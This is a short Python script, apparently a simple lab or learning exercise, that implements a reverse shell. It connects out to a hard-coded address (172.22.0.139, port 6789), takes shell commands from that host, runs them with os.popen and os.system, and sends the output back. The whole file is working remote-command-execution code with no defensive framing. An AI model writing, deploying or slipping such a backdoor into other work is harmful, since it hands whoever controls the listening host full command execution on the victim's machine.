import socket
import os

HOST = "172.22.0.139"
PORT = 6789

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((HOST, PORT))
    if s:
        print("Connection stablished.")
    else:
        print("Unable to connect to the server.")
    while True:
        message = s.recv(4096).decode('utf-8')
        if message[:3] == 'cd ':
            os.chdir(message[3:])
            s.send(f"Directory changed successfully.\n".encode('utf-8'))
        else:
            if message:
                output = os.popen(message).read()
                status_code = os.system(f"{message} >/dev/null")
                if status_code == 0:
                    if len(output) > 0:
                        s.send(f"{output}\n".encode('utf-8'))
                    else:
                        s.send(f"Command execution failed.\n".encode('utf-8'))
                else:
                    s.send(f"Command execution failed.\n".encode('utf-8'))
            else:
                print("Packet not received.")
                break

print(f"Execution completed.")
